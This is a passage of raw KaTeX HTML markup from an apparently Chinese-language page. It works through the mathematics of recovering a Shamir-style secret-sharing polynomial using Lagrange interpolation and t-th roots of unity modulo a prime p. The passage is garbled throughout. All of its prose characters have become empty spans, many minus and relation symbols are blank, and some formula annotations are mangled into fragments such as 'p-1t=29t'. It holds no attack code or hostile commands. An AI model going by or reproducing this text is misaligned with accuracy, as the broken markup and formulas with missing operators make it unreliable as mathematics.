cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">t</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>w</mi><mi>p</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">wp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>P</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo></mo><msub><mi>x</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>x</mi><mo></mo><msub><mi>x</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">(</mo><mi>x</mi><mo></mo><msub><mi>x</mi><mi>t</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)=P_{t-1}(x)+C(x-x_{1})(x-x_{2})...(x-x_{t})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>r</mi><mi>d</mi><mo stretchy="false">(</mo><msubsup><mi>Z</mi><mi>p</mi><mo lspace="0em" rspace="0em"></mo></msubsup><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi><mo></mo><mn>1</mn><mtext></mtext><mi>t</mi><mtext></mtext><mi mathvariant="normal"></mi><mtext></mtext><mi>p</mi><mo></mo><mn>1</mn><mtext></mtext><mi>t</mi><mo>=</mo><mn>29</mn><mtext></mtext><mi>t</mi><mo></mo><mo stretchy="false">[</mo><mn>20</mn><mo separator="true">,</mo><mn>50</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">ord(Z_p^{*})=p-1t\ |\ p-1t=29t\in [20,50]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.133108em;vertical-align:-0.383108em;"></span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord cjk_fallback"></span><span class="mord mathnormal">t</span><span class="mspace"></span><span class="mord"></span><span class="mspace"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord">2</span><span class="mord">9</span><span class="mord cjk_fallback"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">5</span><span class="mord">0</span><span class="mclose">]</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>g</mi><mtext></mtext><mo>&lt;</mo><mi>g</mi><mo>&gt;</mo><mo>=</mo><mo stretchy="false">{</mo><msup><mi>g</mi><mn>0</mn></msup><mo separator="true">,</mo><msup><mi>g</mi><mn>1</mn></msup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msup><mi>g</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msup><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">g&lt;g&gt;=\{g^{0},g^{1},...,g^{t-1}\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mi>t</mi></msup><mo></mo><mn>1</mn><mspace></mspace><mspace width="0.4444444444444444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g^{t}\equiv 1\pmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9879959999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444444444444444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><msub><mi>x</mi><mi>i</mi></msub><mo>=</mo><msup><mi>g</mi><mi>i</mi></msup><mspace></mspace><mspace width="0.4444444444444444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo><mtext></mtext><mi>t</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">x_{i}=g^{i}\pmod pt</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.019104em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444444444444444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord mathnormal">t</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>P</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mi>C</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mi>t</mi></msup><mo></mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)=P_{t-1}(x)+C(x^{t}-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.043556em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>R</mi><mi mathvariant="normal">.</mi><mi>l</mi><mi>a</mi><mi>g</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>p</mi><mi>o</mi><mi>l</mi><mi>y</mi><mi>n</mi><mi>o</mi><mi>m</mi><mi>i</mi><mi>a</mi><mi>l</mi><mo stretchy="false">(</mo><mi>s</mi><mi>h</mi><mi>a</mi><mi>r</mi><mi>e</mi><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>a</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msub><msup><mi>x</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">P_{t-1}(x)=R.lagrange\_polynomial(shares)=a_{t-1}x^{t-1}+...+a_{1}x+a_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">p</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">m</span><span class="mord mathnormal">i</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0224389999999999em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mi>t</mi></msub><msup><mi>x</mi><mi>t</mi></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>c</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>c</mi><mn>0</mn></msub><mo>=</mo><mi>C</mi><mo></mo><msup><mi>x</mi><mi>t</mi></msup><mo>+</mo><msub><mi>a</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msub><msup><mi>x</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>0</mn></msub><mo></mo><mi>C</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c_{t}x^{t}+...+c_{1}x+c_{0}=C\cdot x^{t}+a_{t-1}x^{t-1}+...+a_{1}x+(a_{0}-C)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.943556em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal 